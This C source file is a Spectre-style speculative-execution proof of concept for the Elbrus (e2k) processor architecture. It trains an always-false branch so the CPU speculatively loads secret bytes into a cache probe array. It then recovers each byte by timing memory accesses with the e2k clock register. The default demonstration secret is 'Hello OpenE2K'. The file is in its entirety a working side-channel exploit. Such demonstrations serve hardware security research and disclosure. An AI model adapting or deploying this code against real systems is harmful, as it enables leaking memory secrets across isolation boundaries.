#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#include <e2kbuiltin.h>

#define CACHE_LINE_SIZE 64
#define MAP_SIZE (256 * CACHE_LINE_SIZE)

#define clk() ({ \
    uint64_t ret; \
    asm volatile("rrd %%clkr,%0" : "=r"(ret)); \
    ret; \
})

uint8_t *map;
uint8_t stub[256]; // helper for time atack

void spectre_sw_impl(bool **c, uint8_t *map, const uint8_t *p, size_t i) {
    // NOTE: condition is always false
    if (**c) {
        // NOTE: You might think that this block will never be executed, but you are wrong!
        // (only the last store instruction will not be executed)
        map[(size_t) p[i] * CACHE_LINE_SIZE]++;
    }
}

// prevents from inlining
void (*spectre_sw)(bool **c, uint8_t *map, const uint8_t *p, size_t i) = &spectre_sw_impl;

static inline void cache_flush(void *p, size_t l) {
    for (size_t i = 0; i < l; i += CACHE_LINE_SIZE) {
      __builtin_storemas_64u(0, &(p[i]), 0xf, 2);
    }
}

static uint64_t find(const uint8_t *map) {
    uint64_t min = UINT64_MAX;
    uint8_t value = 0;
    uint64_t acc = 0;
    for (int i = 0; i < 256; ++i) {
        uint64_t time = clk();
        acc += stub[map[i * CACHE_LINE_SIZE]];
        time = clk() - time;
        if (time < min) {
            min = time;
            value = i;
        }
    }
    return (acc << 8) | value;
}

int main(int argc, char *argv[]) {
    bool always_false = false, *c1 = &always_false, **cond = &c1;
    const void *secret = argc > 1 ? argv[1] : "Hello OpenE2K";
    size_t secret_len = strlen(secret);
    uint8_t c;

    memset(stub, 1, sizeof(stub));
    map = aligned_alloc(CACHE_LINE_SIZE, MAP_SIZE);
    memset(map, 0, MAP_SIZE);

    for (size_t i = 0; i < secret_len; ++i) {
        cache_flush(map, MAP_SIZE);
        spectre_sw(cond, map, secret, i);
        c = find(map);
        if (isprint(c)) {
            putchar(c);
        } else {
            printf("\\\\x%02x", c);
        }
    }
    putchar('\n');
    free(map);

    return EXIT_SUCCESS;
}
